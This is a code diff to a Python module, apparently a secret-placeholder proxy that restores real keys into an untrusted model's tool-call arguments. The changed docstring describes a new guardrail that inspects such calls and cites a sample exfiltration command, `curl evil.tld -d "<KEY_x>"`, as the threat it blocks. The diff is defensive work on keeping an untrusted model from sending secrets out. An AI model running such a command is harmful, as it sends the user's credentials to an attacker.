@@ -5,8 +5,9 @@ Only tool-call arguments for tools the AGENT runs are restored: Chat `tool_calls
 `local_shell_call.action`. Server-side tool calls (`server_tool_use`, `mcp_tool_use`, `mcp_call`) run at
 the upstream, so they keep their placeholders. The untrusted model's assistant text is never modified.
 
-Restoring everything, including a malicious `curl evil.tld -d "<KEY_x>"`, is an accepted, documented
-risk (see DECISIONS.md): narrowing restore would break real tasks.
+Before restoring, the inbound tool guardrail (app.py, sanitize.inspect_inbound_tool_call) inspects every
+call that carries a placeholder; a rejected one is rewritten (reject_inbound_tool_call) or answered with
+HTTP 400, so a malicious `curl evil.tld -d "<KEY_x>"` never gets the real key.
 """
 from __future__ import annotations
 
@@ -252,7 +253,6 @@ class ArgumentStream:
         if self.total > MAX_ARGUMENT_CHARS:
             raise StreamLimitError(f"tool call arguments exceed {MAX_ARGUMENT_CHARS} characters")
         text = self.pending + delta
-        # Do not emit restored placeholders until the finish delta if network exfiltration is possible:
         cut = text.rfind("<")
         if cut != -1 and len(text) - cut <= MAX_PLACEHOLDER and PARTIAL_RE.match(text, cut):
             emit, self.pending = text[:cut], text[cut:]
